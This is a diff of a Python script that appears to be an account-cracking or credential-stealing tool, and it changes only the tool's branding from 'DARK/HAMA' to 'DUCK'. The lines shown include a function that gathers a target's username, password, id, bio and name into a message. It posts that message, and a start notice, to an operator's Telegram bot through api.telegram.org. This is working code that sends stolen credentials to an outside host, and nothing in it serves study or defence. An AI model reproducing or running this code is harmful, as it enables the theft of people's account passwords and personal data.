@@ -90,7 +90,7 @@ def a(z):
 import time
 timee=time.asctime()
 print(timee)
-hunter1 = pyfiglet.figlet_format(" DARK ")
+print(logo)
 print(' ')
 def j(z):
     for e in z:
@@ -123,7 +123,7 @@ t = time.localtime()
 current_time = time.strftime("%H:%M:%S", t)
 print('  ') 
 sleep(2)
-start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯ ⚡️ HAMA GOOD HAT 😊😋").json()
+start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯ ⚡️GOOD TOOL NEW DUCK😊😋").json()
 id_msg	=(start_msg['result']["message_id"])
 def code_mrko(userQ,password):
 	cookie = secrets.token_hex(8)*2
@@ -154,11 +154,11 @@ def code_mrko(userQ,password):
 	dat = ree['data']
 	shug = (f"""
 
-Hi,DARK⚡️ HI [HAMA]
+Hi,DUCK⚡️
   
-  <<<HAMA GYAN GOOD HAT>>>
-  ====================
- ⌯ 𝐧𝐚𝐦𝐞 : {name}
+  GOOD NEW 🧸
+====================
+⌯ 𝐧𝐚𝐦𝐞 : {name}
 ⌯ 𝐮𝐬𝐞𝐫 : {userQ}
 ⌯ 𝐩𝐚𝐬𝐬 : {password}
 ⌯ 𝐢𝐝 : {idd}  
@@ -169,7 +169,7 @@ Hi,DARK⚡️ HI [HAMA]
 ⌯ 𝐛𝐢𝐨 : {bio} 
 ⌯ 𝐭𝐢𝐦𝐞 : {current_time} 
  =================
-DARK HACKER  HAMA GYAN
+DARK HACKER  
  """)
 	tlg =(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={shug}''')
 	i = requests.post(tlg)
